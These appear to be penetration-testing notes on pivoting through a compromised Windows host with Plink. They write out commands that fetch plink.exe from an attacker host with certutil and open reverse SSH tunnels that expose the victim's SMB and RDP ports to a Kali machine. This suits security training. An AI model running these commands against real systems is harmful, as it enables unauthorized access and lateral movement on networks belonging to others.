# Plink — Windows Pivot When OpenSSH Is Missing

Check for Windows OpenSSH first (`where ssh`). If `ssh.exe` is absent, **Plink** (PuTTY's command-line SSH client) is a useful lightweight fallback.

## Remote fixed port forward

Example — create a listener on Kali TCP/4455 that forwards back through the Windows client to the victim's local SMB TCP/445:

```cmd
certutil -urlcache -split -f http://<LHOST>/plink.exe plink.exe
cmd /c echo y | .\plink.exe -ssh -l <KALI_USER> -pw <SSH_PASS> -R 127.0.0.1:4455:127.0.0.1:445 <LHOST>
```

Traffic flow:

```text
Kali 127.0.0.1:4455  --> SSH tunnel --> Windows victim 127.0.0.1:445
```

Another useful pattern for RDP:

```cmd
.\plink.exe -ssh -l <KALI_USER> -pw <SSH_PASS> -R 127.0.0.1:9833:127.0.0.1:3389 <LHOST>
```

Then on Kali:

```bash
xfreerdp /v:127.0.0.1:9833 /u:<USER> /p:<PASS>
```

## Host-key prompt in limited shells

A restricted/non-interactive shell may not let you answer Plink's first-connect host-key prompt. Pipe `y` to it:

```cmd
cmd.exe /c echo y | .\plink.exe -ssh -l <KALI_USER> -pw <SSH_PASS> -R <LISTENER>:<TARGET> <LHOST>
```

## Important caveats

- Plink supports much of OpenSSH's forwarding behavior, but **does not provide remote dynamic port forwarding** (`ssh -R <SOCKS_PORT>` style).
- `-pw <PASSWORD>` places the SSH password directly on the command line and may leave it exposed in process history/logging. In a hostile environment, consider a dedicated, low-value SSH account used only for port forwarding instead of reusing an important Kali credential.
- Prefer Windows' built-in `ssh.exe` when it is already present; upload Plink only when needed.
